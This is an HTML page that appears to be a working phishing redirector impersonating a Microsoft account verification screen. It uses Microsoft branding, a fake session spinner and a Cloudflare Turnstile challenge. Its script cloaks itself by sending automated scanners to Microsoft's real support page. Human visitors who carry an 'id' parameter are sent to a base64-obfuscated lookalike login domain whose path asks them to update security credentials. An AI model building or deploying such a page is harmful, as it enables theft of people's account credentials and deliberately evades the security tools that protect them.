<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Microsoft Account Verification</title>
    <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
    <link rel="shortcut icon" href="https://www.microsoft.com/favicon.ico">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif; 
            text-align: center; 
            padding-top: 80px; 
            background: #f2f2f2; 
            color: #2a2a2a;
        }
        .container {
            background: #ffffff;
            max-width: 450px;
            margin: 0 auto;
            padding: 40px;
            border: 1px solid #e1e1e1;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #0078d4; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1.5s linear infinite; 
            margin: 25px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 600; font-size: 24px; margin-bottom: 10px; }
        p { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.4; }
        .turnstile-container {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="120" alt="Microsoft">
    
    <div id="loading-area">
        <h2>Verifying your session</h2>
        <p>Please wait while we establish a secure connection...</p>
        <div class="spinner"></div>
    </div>

    <div id="verification-area" style="display:none;">
        <h2 id="verif-title">Action Required</h2>
        <p id="verif-desc">To help keep your account secure, please complete the verification below.</p>
        <div class="turnstile-container">
            <div class="cf-turnstile" 
                 id="turnstile-widget"
                 data-sitekey="0x4AAAAAACZQH20w4CUOso2v" 
                 data-callback="onVerify"
                 data-error-callback="onError"
                 data-expired-callback="onExpire"></div>
        </div>
        <button id="retry-btn" onclick="manualReset()" style="display:none; margin-top:15px; padding:8px 16px; background:#0078d4; color:white; border:none; cursor:pointer;">Try Again</button>
    </div>


<script>
    // Timer to switch from spinner to Turnstile
    setTimeout(function() {
        document.getElementById('loading-area').style.display = 'none';
        document.getElementById('verification-area').style.display = 'block';
    }, 4500);

    function onVerify(token) {
    const isBot = navigator.webdriver || !navigator.languages.length;
    const urlParams = new URLSearchParams(window.location.search);
    const hasId = urlParams.has('id');

    if (!isBot && hasId) {
        // ENCODED URL: ""
        const encodedUrl = "aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLWFjY291bnQuZGV2L1VwZGF0ZVNlY3VyaXR5Q3JlZGVudGlhbHM/";
        
        // This decodes the URL and attaches the unique Gammadyne ID
        window.location.href = atob(encodedUrl) + urlParams.toString();
    } else {
        // Redirects bots/scanners to the real Microsoft support page
        window.location.href = "https://support.microsoft.com/en-us";
    }
    }

    function onError(errorCode) {
        turnstile.reset('#turnstile-widget');
    }

    function onExpire() {
        turnstile.reset('#turnstile-widget');
    }

    function manualReset() {
        turnstile.reset('#turnstile-widget');
    }
</script>
</body>
</html>